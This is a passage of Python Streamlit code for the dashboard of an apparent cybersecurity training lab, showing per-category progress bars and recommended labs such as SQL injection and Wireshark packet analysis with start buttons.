st.subheader("Progress by Category")

categories = {
    "Linux Basics": 75,
    "Network Security": 50,
    "Web Hacking": 40,
    "Malware Analysis": 25,
    "Digital Forensics": 30
}

for category, progress in categories.items():
    st.markdown(f"**{category}**")
    st.progress(progress / 100)
    st.caption(f"{progress}% Complete")

st.divider()

# ============================================
# RECOMMENDED LABS
# ============================================

st.header("🎯 Recommended for You")

st.markdown("Based on your progress, we recommend:")

recommended = [
    {
        "name": "File Permissions & Privilege Escalation",
        "reason": "Continue your Linux journey",
        "difficulty": "🟡 Intermediate",
        "points": 200
    },
    {
        "name": "Packet Analysis with Wireshark",
        "reason": "Build on your network knowledge",
        "difficulty": "🟡 Intermediate",
        "points": 200
    },
    {
        "name": "SQL Injection Basics",
        "reason": "Start web application security",
        "difficulty": "🟢 Beginner",
        "points": 150
    }
]

for rec in recommended:
    col_r1, col_r2 = st.columns([3, 1])
    with col_r1:
        st.markdown(f"**{rec['name']}** - {rec['difficulty']}")
        st.caption(f"💡 {rec['reason']} | 🎯 {rec['points']} points")
    with col_r2:
        if st.button("Start", key=f"rec_{rec['name']}"):
            st.session_state.active_lab = rec['name']
            st.success(f"✅ Starting {rec['name']}!")
            st.rerun()

# Footer
st.markdown("---")
st.caption("🔬 T21 Cyber Lab Environment - Practice Makes Perfect")
st.caption(f"Last Updated: {datetime.now().strftime('%B %d, %Y at %I:%M %p')}")
